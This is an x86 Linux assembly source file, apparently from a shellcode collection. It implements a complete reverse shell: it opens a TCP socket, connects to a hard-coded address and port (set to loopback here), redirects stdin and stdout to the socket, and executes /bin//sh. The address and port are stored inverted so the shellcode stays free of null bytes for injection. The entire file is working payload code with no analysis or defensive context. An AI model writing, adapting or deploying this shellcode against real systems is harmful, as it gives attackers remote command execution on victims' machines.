section .text
global _start

    %include "../../../utils_linux_x86.asm"

%define AF_INET		2
%define SOCK_STREAM	1
%define IPPROTO_TCP	6

%define IP		0x0100007f
%define PORT		0x0010

_start:
.SOCKET:
	push IPPROTO_TCP
	push SOCK_STREAM
	push AF_INET

	xor ebx, ebx
	xor eax, eax
	mov ecx, esp
	mov bl, SOCK_SOCKET
	mov al, SYS_SOCKETCALL
	int 0x80

	mov esi, eax

.CONNECT:
	mov eax, ~IP
	not eax
	push eax
	mov ax, ~PORT
	not ax
	push word ax
	push word AF_INET
	mov eax, esp

	push 16
	push eax
	push esi

	mov ecx, esp
	xor ebx, ebx
	mov bl, SOCK_CONNECT
	xor eax, eax
	mov al, SYS_SOCKETCALL
	int 0x80

.DUP2:
	mov ebx, esi
	xor ecx, ecx
	xor eax, eax
	mov al, SYS_DUP2
	int 0x80

	mov ebx, esi
	xor ecx, ecx
	inc ecx
	xor eax, eax
	mov al, SYS_DUP2
	int 0x80

.EXECV:
	xor eax, eax
	push eax
	push '//sh'
	push '/bin'
	mov ebx, esp

	push eax
	push ebx

	xor edx, edx
	mov ecx, esp
	mov al, SYS_EXECV
	int 0x80
